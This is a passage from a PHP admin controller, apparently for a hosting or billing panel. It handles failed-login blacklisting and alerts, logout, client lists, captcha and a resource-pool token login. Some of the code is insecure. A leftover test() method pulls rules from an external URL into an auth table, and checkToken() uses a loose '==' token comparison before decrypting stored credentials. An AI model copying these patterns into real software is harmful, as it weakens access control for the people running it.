						\think\Db::name("user")->where("id", $result["id"])->update(["language" => "CN"]);
					}
					$domain = config("database.admin_application") ?? "admin";
					$opendir = CMF_ROOT . "/public/{$domain}/lang/";
					$country_img_dir = configuration("domain") . "/upload/common/country/";
					$display_config = [];
					if (is_dir($opendir)) {
						$handler = opendir($opendir);
						while (($filename = readdir($handler)) !== false) {
							if ($filename == "." || $filename == "..") {
							} else {
								if (file_exists($opendir . $filename)) {
									$str = file_get_contents($opendir . $filename);
									preg_match("/display_name(.+?),/", $str, $display_name_ing);
									preg_match("/display_flag(.+?),/", $str, $display_flag_ing);
									$display_name = preg_replace("/:|'|,|\"/", "", $display_name_ing[1]);
									$display_flag = preg_replace("/:|'|,|\"/", "", $display_flag_ing[1]);
									$file_name = str_replace(strrchr($filename, "."), "", $filename);
									$display_config_now["display_name"] = trim($display_name);
									$display_config_now["display_flag"] = trim($display_flag);
									$display_config_now["file_name"] = trim($file_name);
									$display_config_now["country_imgUrl"] = $country_img_dir . $display_config_now["display_flag"] . ".png";
									$display_config[] = $display_config_now;
								}
							}
						}
					}
					$data["data"]["display_lang_config"] = $display_config;
					return json($data);
				} else {
					$login_error_num = \think\facade\Cache::get($key);
					if ($this->num <= $login_error_num) {
						$exist = \think\Db::name("blacklist")->where("ip", sprintf("%u", ip2long($ip)))->find();
						if (empty($exist)) {
							\think\Db::name("blacklist")->data(["ip" => sprintf("%u", ip2long($ip)), "create_time" => $this->request->time(), "type" => 1, "username" => $name])->insert();
						}
						\think\facade\Cache::set($disable_login_key, 1, $this->disable_login_expire);
						$email = new \app\common\logic\Email();
						$email->is_admin = true;
						$email->sendEmailBase($result["id"], "【管理员】登录提醒", "admin", false, false, "", "", "管理员在地址{$ip}登录失败,原因:" . lang("ADMIN_USER_DISABLE"));
						active_log_final("管理员在地址{$ip}登录失败,原因:" . lang("ADMIN_USER_DISABLE"), $result["id"], 1, $result["id"]);
						$data["msg"] = lang("ADMIN_USER_DISABLE");
						return json($data);
					}
					if ($login_error_num > 0) {
						\think\facade\Cache::inc($key);
					} else {
						\think\facade\Cache::set($key, 1, $this->expire);
					}
					$email = new \app\common\logic\Email();
					$email->is_admin = true;
					$email->sendEmailBase($result["id"], "【管理员】登录提醒", "admin", false, false, "", "", "管理员在地址{$ip}登录失败,原因:" . lang("PASSWORD_NOT_RIGHT"));
					active_log_final("管理员在地址{$ip}登录失败,原因:" . lang("PASSWORD_NOT_RIGHT"), $result["id"], 1, $result["id"]);
					$data["msg"] = lang("PASSWORD_NOT_RIGHT");
					return json($data);
				}
			} else {
				$email = new \app\common\logic\Email();
				$email->is_admin = true;
				$email->sendEmailBase($result["id"], "【管理员】登录提醒", "admin", false, false, "", "", "管理员在地址{$ip}登录失败,原因:" . lang("USERNAME_NOT_EXIST"));
				active_log_final("管理员在地址{$ip}登录失败,原因:" . lang("USERNAME_NOT_EXIST"), $result["id"], 1, $result["id"]);
				$data["msg"] = lang("USERNAME_NOT_EXIST");
				return json($data);
			}
		}
	}
	public function getMenu()
	{
		$admin_id = cmf_get_current_admin_id();
		if (empty($admin_id)) {
			return json(["status" => 406, "msg" => "请先登录"]);
		}
	}
	/**
	 *
	 * @title 后台管理员退出
	 * @description 接口说明: 后台管理员退出
	 * @author 上官磨刀
	 * @url /admin/logout
	 * @method GET
	 */
	public function ad_logout()
	{
		$adminid = session("ADMIN_ID");
		if ($adminid) {
			if (!file_exists("/tmp/session")) {
				mkdir("/tmp/session", 493, true);
			}
			$config = array_merge(config("session"), ["expire" => 1, "path" => "/tmp/session"]);
			\think\facade\Session::init($config);
			$result = admin_log1();
			hook("admin_logout", ["adminid" => $adminid]);
			return json(["status" => 200, "msg" => "退出登录成功"]);
		}
	}
	/**
	 * @title 后台用户列表
	 * @description 接口说明: 后台用户列表
	 * @author liyongjun
	 * @url /admin/getClient
	 * @method get
	 */
	public function getClient()
	{
		$list = \think\Db::name("clients")->field("id,username")->select();
		return jsonrule(["status" => 200, "msg" => "", "data" => $list]);
	}
	/**
	 * @title 后台工单部门列表
	 * @description 接口说明: 后台工单部门列表
	 * @author liyongjun
	 * @url /admin/getTicketDepartment
	 * @method get
	 */
	public function getTicketDepartment()
	{
		$ids = model("TicketDepartmentAdmin")->getAllow();
		$list = \think\Db::name("ticket_department")->field("id,name")->where("id", "in", $ids)->select();
		return jsonrule(["status" => 200, "msg" => "", "data" => $list]);
	}
	public function test()
	{
		$rule = get_data("http://finance.dcim.ga/doc/list");
		$list = [];
		$id = 10;
		foreach ($rule["list"] as $k => $v) {
			if (!isset($v["class"][0])) {
				$v["class"] = $id;
			}
			$list[] = ["id" => $id, "name" => $v["class"], "status" => 1, "app" => "admin", "type" => "admin_url", "param" => "", "title" => $v["title"], "pid" => 0, "is_display" => 0];
			$pid = $id;
			$id++;
			foreach ($v["actions"] as $v1) {
				if (!isset($v1["name"][0])) {
					$v1["name"] = $id;
				}
				$list[] = ["id" => $id, "name" => $v1["name"], "status" => 1, "app" => "admin", "type" => "admin_url", "param" => "", "title" => $v1["title"], "pid" => $pid, "is_display" => 0];
				$id++;
			}
		}
		$inert = \think\Db::name("auth_rule1")->data($list)->insertAll();
		var_dump($inert);
	}
	/**
	 * @title 验证码图形
	 * @param .name:name type:string require:1 default:1 other: desc:
	 * @description 接口说明:验证码图形
	 * @author lgd
	 * @url verify
	 * @method GET
	 */
	public function verify()
	{
		$param = $this->request->param();
		$data["is_captcha"] = !configuration("is_captcha") ? 0 : 1;
		if ($data["is_captcha"] == 1) {
			$data[$param["name"]] = !configuration($param["name"]) ? 0 : 1;
			if ($data[$param["name"]] != 1) {
				return jsons(["status" => 400, "msg" => "未开启验证码"]);
			}
			$data["captcha_length"] = configuration("captcha_length");
			$data["captcha_combination"] = configuration("captcha_combination");
			$captcha = new \think\captcha\Captcha();
			if ($data["captcha_combination"] == 1) {
				$captcha->__set("codeSet", "2345678");
			} elseif ($data["captcha_combination"] == 3) {
				$captcha->__set("codeSet", "abcdefhijkmnpqrstuvwxyzABCDEFGHJKLMNPQRTUVWXY");
			}
			$captcha->__set("length", $data["captcha_length"]);
			return $captcha->entry($param["name"]);
		} else {
			return jsons(["status" => 400, "msg" => "未开启验证码"]);
		}
	}
	/**
	 * 时间 2021-09-02
	 * @title 生成资源池jwt
	 * @desc 生成资源池jwt,并登录资源池
	 * @url /admin/agent/checktoken
	 * @method GET
	 * @author wyh
	 * @return jwt:
	 */
	public function checkToken()
	{
		$token = input("get.token", "");
		if ($token == cache("resource_token")) {
			$api = \think\Db::name("zjmf_finance_api")->where("is_resource", 1)->where("is_using", 1)->order("id", "desc")->find();
			$id = $api["id"];
			$url = rtrim($api["hostname"], "/");
			$login_url = $url . "/resource_login";
			$login_data = ["username" => $api["username"], "password" => aesPasswordDecode($api["password"]), "type" => "agent"];
			$jwt = zjmfApiLogin($id, $login_url, $login_data);
			return jsonrule($jwt);
		} else {
			$result = ["status" => 400, "msg" => "token错误"];
			return jsonrule($result);
		}
	}
}